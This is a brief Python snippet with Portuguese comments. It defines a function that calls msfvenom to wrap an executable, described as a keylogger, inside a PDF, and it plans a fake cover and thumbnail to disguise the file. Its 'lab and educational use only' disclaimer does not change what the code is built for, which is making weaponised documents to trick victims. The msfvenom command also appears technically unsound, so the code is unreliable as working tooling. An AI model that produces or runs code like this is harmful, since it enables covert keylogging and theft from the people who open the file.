import os

def gerar_pdf_hibrido(exe_path, pdf_path):
    """
    Gera um PDF híbrido com o keylogger embutido.
    Apenas para uso em laboratório seguro e testes educativos.
    """
    os.system(f'msfvenom -p windows/exec CMD="{exe_path}" -f pdf > "{pdf_path}"')
    # Adicionar capa fake, gráficos e miniatura no ambiente seguro